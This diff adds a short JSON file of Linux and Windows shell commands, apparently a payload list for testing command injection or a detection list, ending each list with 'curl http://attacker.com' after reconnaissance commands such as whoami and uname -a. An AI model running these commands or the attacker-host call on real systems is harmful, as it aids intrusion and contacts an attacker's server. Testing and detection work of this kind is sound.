@@ -1,0 +1,16 @@
+{
+  "linux": [
+    "ls",
+    "whoami",
+    "id",
+    "uname -a",
+    "curl http://attacker.com"
+  ],
+  "windows": [
+    "dir",
+    "whoami",
+    "type C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "powershell -Command \"Get-Process\"",
+    "curl http://attacker.com"
+  ]
+}
